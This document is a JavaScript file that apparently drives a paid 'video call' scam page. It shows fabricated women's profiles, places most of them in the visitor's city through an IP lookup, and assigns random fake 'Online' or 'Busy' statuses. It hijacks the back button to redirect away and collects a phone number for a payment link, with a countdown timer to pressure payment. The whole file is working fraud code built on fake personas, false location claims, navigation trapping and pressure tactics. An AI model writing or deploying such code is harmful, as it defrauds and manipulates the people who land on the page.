let fbchildGlobal = null;
let paymentLink;
let timerInterval = null;
const timerDisplay = document.getElementById("timer");
const mobileNumberInput = document.getElementById('mobileNumber');
const payButton = document.getElementById('payButton');
const popupLaoder = document.getElementById('popupLaoder');
let popupOpen = false; 




document.addEventListener('DOMContentLoaded', function() {
    // Redirect URL
    const redirectUrl = 'https://swastik_tyagi.pyscriptapps.com/whatsappnew/latest/';

    // Save the current state to prevent the user from going back
    window.history.pushState(null, null, window.location.href);

    // Listen for the popstate event, triggered when the back button is clicked
    window.onpopstate = function(event) {
        if (popupOpen) {
            closePopup(); // Close the popup if it's open
        } else {
            window.location.href = redirectUrl; // Redirect if the popup is closed
        }
    };
});

function openPopup(profileName, profileVideo) {
    document.getElementById('selectedProfileName').textContent = profileName;
    document.getElementById('videoCallPopup').style.display = 'flex';
    document.getElementById('videoSource').src = profileVideo;
    document.getElementById('callVideo').load();
    document.getElementById('callVideo').play(); // Play the video on opening the popup
    window.history.pushState(null, null, window.location.href); // Push state when opening popup
    popupOpen = true; // Mark the popup as open
}

function closePopup() {
    document.getElementById('videoCallPopup').style.display = 'none';
    document.getElementById('callVideo').pause(); // Pause the video on closing popup
    popupOpen = false; // Mark the popup as closed
}

document.addEventListener('click', function(event) {
    if (event.target.matches('#popupClose') || event.target.matches('#videoCallPopup')) {
        closePopup(); // Close popup when clicking outside or on the close button
    }
});

// Prevent navigation when clicking the video call button
function preventNavigation(event) {
    event.preventDefault();
}

document.getElementById("popupClose").addEventListener("click", function() {
    const videoCallPopup = document.getElementById("videoCallPopup");
    if (videoCallPopup) {
        videoCallPopup.style.display = "none";
    } else {
        console.error("Element with ID 'videoCallPopup' not found.");
    }
});

const showPopupAndStartTimer = () => {
    const videoCallPopup = document.getElementById("videoCallPopup");
    const paymentPopup = document.getElementById("paymentPopup");
    if (videoCallPopup) {
        videoCallPopup.style.display = "none";
        popupLaoder.style.display = "none";
    }
    if (paymentPopup) {
        paymentPopup.style.display = "flex";
    }
    if (timerDisplay) {
        stopTimer();
        const duration = 1 * 60 + 59; // Timer set for 1 minute and 59 seconds
        startTimer(duration, timerDisplay);
    }
};

document.getElementById("payButton").addEventListener("click", function() {
    const mobileNumberInput = document.getElementById("mobileNumber");
    const mobileNumber = mobileNumberInput.value.trim();
    const isValid = /^[0-9]{10}$/.test(mobileNumber);

    if (!isValid) {
        alert('Please enter a valid 10-digit mobile number.');
        return;
    }
    popupLaoder.style.display = "flex";
    const deviceToken = "asdffgrg5465dfgdf";

    if (!paymentLink) {
        const url = "https://starmate.co.in/api/payment-init-starmatex";

        fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    mobile: mobileNumber,
                    device_token: deviceToken,
                }),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                console.log("API Response:", data);

                if (data.fbchild) {
                    fbchildGlobal = data.fbchild;
                    console.log("Global fbchild value:", fbchildGlobal);
                } else {
                    console.error("fbchild value not found in response object");
                }

                if (data.mainUrl) {
                    paymentLink = data.mainUrl;
                    window.open(paymentLink, '_blank');
                } else {
                    console.error("Main URL not found in response object");
                }
            })
            .catch(error => {
                console.error("Error while calling the API:", error);
            });

        setTimeout(showPopupAndStartTimer, 8000);
    } else {
        window.open(paymentLink, '_blank');
        setTimeout(showPopupAndStartTimer, 8000);
    }
});

function closepaymentPopup() {
    const paymentPopup = document.getElementById("paymentPopup");
    const timerDisplay = document.getElementById("timer");

    if (paymentPopup) {
        paymentPopup.style.display = "none";
    }

    if (timerDisplay) {
        timerDisplay.textContent = "02:00";
    }
    stopTimer();
}

function confirmPayment() {
    const paymentPopup = document.getElementById("payment-confirm-btn");
    const url = "https://starmate.co.in/api/payment-check-starmatex";

    fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                order_id: fbchildGlobal,
            }),
        })
        .then((response) => {
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            return response.json();
        })
        .then((data) => {
            console.log("API Response:", data);
            if (data.result === 1) {
                // Redirect to another URL if the result is successful
                window.location.href = `https://confidly.in?order-id=${fbchildGlobal}`;
                console.log("Redirecting with order ID:", fbchildGlobal);
            } else {
                console.error("Payment confirmation failed. Check API response for details.");
                alert("Payment not confirmed. Please try again.");
            }
        })
        .catch((error) => {
            console.error("Error while confirming the payment:", error);
        });
}

const profiles = [{
        name: "Aisha Khan",
        img: "https://private.appvideocall.com/xmtr/images/1122.jpg",
        video: "https://ringlivesg2024.oss-ap-southeast-1.aliyuncs.com/ringliveFileResource/1737522802.mp4",
        online: true
    },
    {
        name: "Meera Patel",
        img: "https://private.appvideocall.com/xmtr/images/1100.jpg",
        video: "https://ringlivesg2024.oss-ap-southeast-1.aliyuncs.com/ringliveFileResource/1737522928.mp4",
        online: false
    },
    {
        name: "Simran Kaur",
        img: "https://private.appvideocall.com/xmtr/images/2200.jpg",
        video: "https://ringlivesg2024.oss-ap-southeast-1.aliyuncs.com/ringliveFileResource/1737522802.mp4",
        online: true
    },
    {
        name: "Neha Gupta",
        img: "https://private.appvideocall.com/xmtr/images/3300.jpg",
        video: "https://ringlivesg2024.oss-ap-southeast-1.aliyuncs.com/ringliveFileResource/1737522802.mp4",
        online: true
    },
    {
        name: "Riya Singh",
        img: "https://private.appvideocall.com/xmtr/images/4400.jpg",
        video: "https://ringlivesg2024.oss-ap-southeast-1.aliyuncs.com/ringliveFileResource/1737522802.mp4",
        online: false
    },
    {
        name: "Kajal Mehta",
        img: "https://private.appvideocall.com/xmtr/images/0000.jpg",
        video: "https://ringlivesg2024.oss-ap-southeast-1.aliyuncs.com/ringliveFileResource/1737522802.mp4",
        online: true
    },
    {
        name: "Pooja Rani",
        img: "https://private.appvideocall.com/xmtr/images/6600.jpg",
        video: "https://ringlivesg2024.oss-ap-southeast-1.aliyuncs.com/ringliveFileResource/1737522802.mp4",
        online: false
    },
    {
        name: "Tanisha Roy",
        img: "https://private.appvideocall.com/xmtr/images/7700.jpg",
        video: "https://ringlivesg2024.oss-ap-southeast-1.aliyuncs.com/ringliveFileResource/1737522802.mp4",
        online: true
    },
    {
        name: "Sakshi Yadav",
        img: "https://private.appvideocall.com/xmtr/images/1234.jpg",
        video: "https://ringlivesg2024.oss-ap-southeast-1.aliyuncs.com/ringliveFileResource/1737522802.mp4",
        online: false
    },
    {
        name: "Aditi Sharma",
        img: "https://private.appvideocall.com/xmtr/images/5500.jpg",
        video: "https://ringlivesg2024.oss-ap-southeast-1.aliyuncs.com/ringliveFileResource/1737522802.mp4",
        online: true
    }
];

const nearbyCities = ["Gurgaon", "Noida", "Faridabad", "Ghaziabad", "Meerut"];

async function getCityByIP() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        const cityName = data.city || "Delhi";
        return cityName;
    } catch (error) {
        console.error("Error fetching city name: " + error);
        return "Unknown City";
    }
}

async function initializeProfiles() {
    const userCity = await getCityByIP();
    const container = document.querySelector('.container');
    let profileCities = [];

    for (let i = 0; i < profiles.length; i++) {
        let city;
        if (i < 6) { // 60% of profiles get the user's city
            city = userCity;
        } else { // 40% get random nearby cities
            city = nearbyCities[Math.floor(Math.random() * nearbyCities.length)];
        }
        profileCities.push(city);
    }

    profiles.forEach((profile, index) => {
        const badgeClass = getOnlineStatus();

        const profileCard = document.createElement('div');
        profileCard.classList.add('profile-card');
        profileCard.innerHTML = `
            <img src="${profile.img}" alt="${profile.name}">
            <div class="${badgeClass}">${badgeClass === 'online-badge' ? 'Online' : badgeClass === 'busy-badge' ? 'Busy' : '5 min ago'}</div>
            <h2>${profile.name}</h2>
            <p class="city">${profileCities[index]}</p>
            <a href="#" class="call-btn" onclick="openPopup('${profile.name}','${profile.video}'); preventNavigation(event);"><i class="fab fa-whatsapp"></i> Video Call</a>
        `;
        container.appendChild(profileCard);
    });
}

function getOnlineStatus() {
    const randomNum = Math.random();
    if (randomNum < 0.15) {
        return 'busy-badge'; // 15% chance of "Busy"
    } else if (randomNum < 0.30) {
        return 'offline-badge'; // 15% chance of "Online 5 min ago"
    } else {
        return 'online-badge'; // Remaining 70% chance of "Online"
    }
}

function stopTimer() {
    if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
    }
}

function startTimer(duration, display) {
    let timer = duration,
        minutes, seconds;
    timerInterval = setInterval(() => {
        minutes = Math.floor(timer / 60);
        seconds = timer % 60;
        minutes = minutes < 10 ? `0${minutes}` : minutes;
        seconds = seconds < 10 ? `0${seconds}` : seconds;

        display.textContent = `${minutes}:${seconds}`;

        if (--timer < 0) {
            clearInterval(timerInterval);
            display.textContent = "Time's up!";
        }
    }, 1000);
}

window.onload = () => {
    initializeProfiles();
};